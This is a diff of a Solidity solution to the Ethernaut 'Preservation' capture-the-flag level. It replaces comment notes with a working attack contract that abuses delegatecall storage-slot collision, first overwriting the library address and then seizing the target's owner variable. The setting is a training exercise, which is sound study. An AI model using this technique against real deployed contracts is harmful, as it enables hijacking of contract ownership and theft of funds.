@@ -6,22 +6,35 @@ pragma solidity ^0.8.20;
  * @dev Claim ownership of the instance you are given.
  */
 
-// The storage of the Preservation contract and the one of the LibraryContract are not the same.
-// Delegatecall was not a good option here.
-// 1. Deploy a new contract wih a modified logic in the setTime function (setting ownership to us for instance)
-// 2. Call the setFirstTime function with the address of the new deployed contract.
-// 3. Call the setFirstTime function again with any value to change the ownership.
+interface IPreservation {
+    function owner() external view returns (address);
 
-contract Ethernaut_Preservation {
-    address public timeZone1Library;
-    address public timeZone2Library;
-    address public owner;
-    uint storedTime;
-
-    function setTime(uint _time) public {
-        storedTime = _time;
-        owner = msg.sender;
-    }
+    function setFirstTime(uint256 _time) external;
 }
 
-// 🎉 Level completed! 🎉
+contract Disappearance {
+    address public timeZone1Library;
+    address public preservation;
+    address public owner;
+
+    constructor(address _preservation) {
+        preservation = _preservation;
+    }
+
+    function attack() public {
+        // 1. Override the timeZone1Library address
+        IPreservation(preservation).setFirstTime(
+            uint256(uint160(address(this)))
+        );
+        // 1. Override the owner address
+        IPreservation(preservation).setFirstTime(uint256(uint160(msg.sender)));
+        require(
+            IPreservation(preservation).owner() == msg.sender,
+            "Hack failed!"
+        );
+    }
+
+    function setTime(uint _time) public {
+        owner = address(uint160(_time));
+    }
+}
